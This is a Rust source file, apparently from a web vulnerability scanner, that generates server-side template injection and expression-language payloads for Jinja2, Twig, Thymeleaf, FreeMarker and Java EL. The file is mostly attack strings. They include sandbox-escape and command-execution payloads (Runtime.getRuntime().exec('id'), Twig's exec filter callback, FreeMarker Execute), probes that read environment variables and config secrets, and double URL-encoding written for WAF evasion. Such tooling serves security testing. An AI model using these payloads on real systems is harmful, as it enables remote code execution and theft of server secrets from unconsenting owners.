//! Template and Expression Language Payload Generation
//! Builds template and expression payload variants with sandbox-aware detection.
//! Implements bounded memory usage for 2GB RAM ceiling compliance.

use std::borrow::Cow;
use std::collections::VecDeque;

/// Bounded template/EL payload generator
pub struct TemplatePayloads {
    payload_queue: VecDeque<Cow<'static, str>>,
    max_payloads: usize,
    mutation_index: usize,
}

impl TemplatePayloads {
    pub fn new(max_payloads: usize) -> Self {
        Self {
            payload_queue: VecDeque::with_capacity(max_payloads.min(1024)),
            max_payloads: max_payloads.min(1024),
            mutation_index: 0,
        }
    }

    /// Generate SSTI math canary payloads
    pub fn math_canary_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{7*7}",
            "[[${7*7}]]",
        ].into_iter()
    }

    /// Generate SSTI object access payloads (safe probes)
    pub fn object_access_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{{self}}",
            "${applicationScope}",
            "#{requestScope}",
            "{{config}}",
            "${sessionScope}",
        ].into_iter()
    }

    /// Generate EL property access payloads
    pub fn el_property_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "${param.name}",
            "${header.user-agent}",
            "${cookie.sessionId}",
            "#{facesContext.viewRoot}",
            "${pageContext.request.contextPath}",
        ].into_iter()
    }

    /// Generate sandbox escape attempt payloads (detection only)
    pub fn sandbox_escape_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${T(java.lang.String).forName('java.lang.Runtime')}",
            "#{T(java.lang.Runtime).getRuntime()}",
            "{{request|attr('application')|attr('__globals__')}}",
        ].into_iter()
    }

    /// Generate Freemarker-specific payloads
    pub fn freemarker_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "${?version}",
            "${.ftl_version}",
            "${freemarker.template.utility.Execute?new()}",
            "${class.getClass().forName('java.lang.Runtime')}",
        ].into_iter()
    }

    /// Generate Thymeleaf-specific payloads
    pub fn thymeleaf_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
            "[[__${T(java.lang.System).getenv()}__]]",
            "[[${@org.apache.commons.io.IOUtils@toString(T(java.lang.Runtime).getRuntime().getInputStream())}]]",
        ].into_iter()
    }

    /// Generate Twig-specific payloads
    pub fn twig_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{{dump(app)}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
            "{{app.request.server.all()}}",
            "{% for c in app.request.query.all() %}{{c}}{% endfor %}",
        ].into_iter()
    }

    /// Generate Jinja2-specific payloads
    pub fn jinja2_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{{config.items()}}",
            "{{self.__init__.__globals__}}",
            "{{request.application.__globals__}}",
            "{% for key in config %}{{key}}{% endfor %}",
        ].into_iter()
    }

    /// Generate URL-encoded variants
    pub fn url_encoded_payloads(&self) -> impl Iterator<Item = String> {
        self.math_canary_payloads()
            .chain(self.object_access_payloads())
            .map(|p| self.url_encode(p))
    }

    /// Generate double-encoded payloads for WAF evasion
    pub fn double_encoded_payloads(&self) -> impl Iterator<Item = String> {
        self.url_encoded_payloads().map(|p| self.url_encode(&p))
    }

    /// Queue a payload for later use
    pub fn queue_payload(&mut self, payload: Cow<'static, str>) {
        if self.payload_queue.len() >= self.max_payloads {
            self.payload_queue.pop_front();
        }
        self.payload_queue.push_back(payload);
    }

    /// Get queued payloads
    pub fn get_queued(&self) -> impl Iterator<Item = &Cow<'static, str>> {
        self.payload_queue.iter()
    }

    /// Mutate a base payload
    pub fn mutate(&mut self, base: &str) -> String {
        self.mutation_index = (self.mutation_index + 1) % 8;
        
        match self.mutation_index {
            0 => base.to_string(),
            1 => format!("{}//comment", base),
            2 => format!("{}/*{}*/", base, self.mutation_index),
            3 => self.url_encode(base),
            4 => base.replace("{", "{ ").replace("}", " }"),
            5 => base.to_uppercase(),
            6 => base.replace("\"", "'"),
            _ => base.chars().rev().collect(),
        }
    }

    /// Clear the payload queue
    pub fn clear_queue(&mut self) {
        self.payload_queue.clear();
    }

    /// Get queue size
    pub fn queue_size(&self) -> usize {
        self.payload_queue.len()
    }

    /// Simple URL encoding
    fn url_encode(&self, s: &str) -> String {
        let mut result = String::with_capacity(s.len() * 2);
        for c in s.chars() {
            match c {
                'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => result.push(c),
                ' ' => result.push_str("%20"),
                '{' => result.push_str("%7B"),
                '}' => result.push_str("%7D"),
                '#' => result.push_str("%23"),
                '$' => result.push_str("%24"),
                '[' => result.push_str("%5B"),
                ']' => result.push_str("%5D"),
                '(' => result.push_str("%28"),
                ')' => result.push_str("%29"),
                '<' => result.push_str("%3C"),
                '>' => result.push_str("%3E"),
                '%' => result.push_str("%25"),
                _ => result.push(c),
            }
        }
        result
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_math_canary_payloads() {
        let payloads = TemplatePayloads::new(100);
        let count: usize = payloads.math_canary_payloads().count();
        assert_eq!(count, 6);
    }

    #[test]
    fn test_sandbox_escape_payloads() {
        let payloads = TemplatePayloads::new(100);
        let count: usize = payloads.sandbox_escape_payloads().count();
        assert_eq!(count, 4);
    }

    #[test]
    fn test_queue_bounded() {
        let mut gen = TemplatePayloads::new(3);
        for i in 0..5 {
            gen.queue_payload(Cow::Owned(format!("payload{}", i)));
        }
        assert_eq!(gen.queue_size(), 3);
    }

    #[test]
    fn test_url_encoding() {
        let gen = TemplatePayloads::new(100);
        let encoded = gen.url_encode("{{7*7}}");
        assert!(encoded.contains("%7B"));
    }
}
